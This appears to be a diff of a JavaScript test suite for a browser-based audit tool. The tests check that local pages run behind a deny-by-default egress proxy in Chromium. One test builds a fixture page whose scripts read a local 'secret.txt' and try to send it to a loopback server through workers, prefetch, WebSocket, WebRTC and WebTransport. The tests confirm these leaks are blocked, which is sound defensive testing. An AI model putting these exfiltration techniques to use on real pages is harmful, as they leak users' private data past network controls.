@@ -2,6 +2,7 @@
  * runtime-ux-audit dynamic pass: pure helpers and the loopback server run
  * everywhere; the probes run in real Chromium and skip cleanly without it.
  */
+import dgram from 'node:dgram';
 import { mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import http from 'node:http';
 import net from 'node:net';
@@ -351,8 +352,83 @@ describe('runDynamicPass without a browser', () => {
         throw missing;
       };
       await expect(runDynamicPass({ page: { kind: 'file', url: '', filePath: join(root, 'index.html'), root }, launch })).rejects.toBe(missing);
+      // A local input launches behind the egress proxy, with no WebRTC UDP and no DNS in Chromium.
+      expect(seen).toEqual({
+        channel: 'chromium',
+        ignoreDefaultArgs: ['--disable-back-forward-cache'],
+        proxy: { server: expect.stringMatching(/^http:\/\/127\.0\.0\.1:\d+$/), bypass: '<-loopback>' },
+        args: ['--webrtc-ip-handling-policy=disable_non_proxied_udp', '--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1'],
+      });
+      await expect(runDynamicPass({ page: { kind: 'http', url: 'http://127.0.0.1:9/' }, launch })).rejects.toBe(missing);
       expect(seen).toEqual({ channel: 'chromium', ignoreDefaultArgs: ['--disable-back-forward-cache'] });
       expect(LAUNCH_OPTIONS.channel).toBe('chromium');
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('starts a deny-by-default proxy for a local input and closes it with the pass', async () => {
+    const { dir, cleanup } = tempDir('ux-dyn-proxy-');
+    try {
+      writeFiles(dir, { 'index.html': '<p>x</p>' });
+      const root = safeRealpath(dir);
+      const page = { kind: 'file', url: '', filePath: join(root, 'index.html'), root };
+      const hits = [];
+      await withServer((req, res) => {
+        hits.push(`${req.method} ${req.url}`);
+        res.writeHead(200, { 'Content-Type': 'text/plain', 'Content-Length': 13, 'X-Upstream': 'yes' });
+        res.end('upstream body');
+      }, async (other) => {
+        const { host } = new URL(other);
+        const stop = new Error('stop');
+        let proxyPort = 0;
+        // The launch hook runs while the proxy is up: talk to it the way Chromium would, then end the pass.
+        const through = async (allowOrigins) => {
+          const seen = {};
+          const launch = async (opts) => {
+            proxyPort = Number(new URL(opts.proxy.server).port);
+            seen.get = await rawRequest(proxyPort, `${other}/file?q=1`, { host });
+            seen.originForm = await rawRequest(proxyPort, '/index.html', { host });
+            seen.tunnel = await new Promise((resolve, reject) => {
+              const sock = net.connect(proxyPort, '127.0.0.1', () => sock.write(`CONNECT ${host} HTTP/1.1\r\nHost: ${host}\r\n\r\n`));
+              let data = '';
+              let sent = false;
+              sock.setEncoding('latin1');
+              sock.on('data', (d) => {
+                data += d;
+                if (!sent && data.startsWith('HTTP/1.1 200') && data.includes('\r\n\r\n')) {
+                  sent = true;
+                  sock.write(`GET /tunnel HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
+                }
+              });
+              sock.on('end', () => resolve(data));
+              sock.on('error', reject);
+            });
+            throw stop;
+          };
+          await expect(runDynamicPass({ page, launch, allowOrigins })).rejects.toBe(stop);
+          return seen;
+        };
+
+        const denied = await through([]);
+        expect(denied.get.status).toBe(403);
+        expect(denied.originForm.status).toBe(403);
+        expect(denied.tunnel).toMatch(/^HTTP\/1\.1 403 /);
+        expect(hits).toEqual([]);
+        await expect(new Promise((resolve, reject) => {
+          net.connect(proxyPort, '127.0.0.1').once('connect', resolve).once('error', reject);
+        })).rejects.toThrow();
+
+        const allowed = await through([other]);
+        expect(allowed.get.status).toBe(200);
+        expect(allowed.get.head).toContain('x-upstream: yes');
+        expect(allowed.get.body).toBe('upstream body');
+        // Still a proxy only: a request that names no allowed origin is refused.
+        expect(allowed.originForm.status).toBe(403);
+        expect(allowed.tunnel).toMatch(/^HTTP\/1\.1 200 /);
+        expect(allowed.tunnel).toContain('upstream body');
+        expect(hits).toEqual(['GET /file?q=1', 'GET /tunnel']);
+      });
     } finally {
       cleanup();
     }
@@ -627,6 +703,84 @@ describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
       }
     });
   }, 180_000);
+
+  it('blocks worker, prefetch, WebRTC and WebTransport egress from a local page', async () => {
+    // Loopback only: an HTTP server, a UDP socket and a TCP server that no local page may reach.
+    const hits = [];
+    const datagrams = [];
+    const tcpConnections = [];
+    const udp = dgram.createSocket('udp4');
+    udp.on('message', (msg) => datagrams.push(msg.length));
+    await new Promise((r) => udp.bind(0, '127.0.0.1', r));
+    const tcp = net.createServer((sock) => {
+      tcpConnections.push(sock.remotePort);
+      sock.on('error', () => {});
+      sock.resume();
+    });
+    await new Promise((r) => tcp.listen(0, '127.0.0.1', r));
+    const udpPort = udp.address().port;
+    const tcpPort = tcp.address().port;
+    try {
+      await withServer((req, res) => {
+        hits.push(req.url);
+        res.writeHead(204, { 'access-control-allow-origin': '*' });
+        res.end();
+      }, async (other) => {
+        const { dir, cleanup } = tempDir('ux-dyn-egress-');
+        try {
+          const leak = (name) => `fetch('secret.txt').then((r) => r.text()).then((t) => fetch('${other}/${name}?d=' + t, { mode: 'no-cors' })).catch(() => {});`;
+          writeFiles(dir, {
+            'secret.txt': 'FILE-UNDER-ROOT',
+            'shared.js': `${leak('from-sharedworker')}\n`
+              + `try { new WebSocket('${other.replace('http:', 'ws:')}/ws-from-sharedworker').onerror = () => {}; } catch {}\n`
+              + `try { new WebTransport('https://127.0.0.1:${udpPort}/wt').ready.catch(() => {}); } catch {}\n`,
+            'worker.js': `${leak('from-worker')}\n`,
+            'index.html': '<!doctype html><meta name="viewport" content="width=device-width"><p>x</p><script>'
+              + "fetch('secret.txt').then((r) => r.text()).then((secret) => {"
+              + "  new SharedWorker('shared.js');"
+              + "  new Worker('worker.js');"
+              + "  const rules = document.createElement('script');"
+              + "  rules.type = 'speculationrules';"
+              + `  rules.textContent = JSON.stringify({ prefetch: [{ source: 'list', urls: ['${other}/from-prefetch?d=' + secret], eagerness: 'immediate' }] });`
+              + '  document.head.append(rules);'
+              + '  const pc = new RTCPeerConnection({ iceServers: ['
+              + `    { urls: 'stun:127.0.0.1:${udpPort}' },`
+              + `    { urls: 'turn:127.0.0.1:${udpPort}?transport=udp', username: secret, credential: 'x' },`
+              + `    { urls: 'turn:127.0.0.1:${tcpPort}?transport=tcp', username: secret, credential: 'x' },`
+              + '  ] });'
+              + "  pc.createDataChannel('x');"
+              + '  pc.createOffer().then((offer) => pc.setLocalDescription(offer));'
+              + `  try { new WebTransport('https://127.0.0.1:${udpPort}/wt').ready.catch(() => {}); } catch {}`
+              + '});</script>',
+          });
+          const root = safeRealpath(dir);
+          const filePath = join(root, 'index.html');
+          const input = { page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root }, limits: { settleMs: 500, maxTabs: 1, maxTaps: 1, maxDialogTriggers: 1 } };
+          const blocked = await runDynamicPass(input);
+          expect(blocked.navigation).toEqual({ status: 200, finalUrl: 'index.html' });
+          expect(hits).toEqual([]);
+          expect(datagrams).toEqual([]);
+          expect(tcpConnections).toEqual([]);
+          const network = blocked.errors.filter((e) => e.probe === 'network');
+          expect(network).toHaveLength(1);
+          expect(network[0].message).toContain(other);
+          // The same page with the origin allowed: the worker and prefetch requests arrive, so the fixture does try them.
+          const allowed = await runDynamicPass({ ...input, allowOrigins: [other] });
+          expect(hits).toEqual(expect.arrayContaining([
+            '/from-sharedworker?d=FILE-UNDER-ROOT', '/from-worker?d=FILE-UNDER-ROOT', '/from-prefetch?d=FILE-UNDER-ROOT', '/ws-from-sharedworker',
+          ]));
+          expect(allowed.errors.filter((e) => e.probe === 'network' && e.message.includes(other))).toEqual([]);
+          // WebRTC never gets a UDP socket for a local page, whatever is allowed.
+          expect(datagrams).toEqual([]);
+        } finally {
+          cleanup();
+        }
+      });
+    } finally {
+      await new Promise((r) => udp.close(r));
+      await new Promise((r) => tcp.close(r));
+    }
+  }, 240_000);
 
   it('records a failed navigation and skips the page probes', async () => {
     const port = await new Promise((resolve) => {
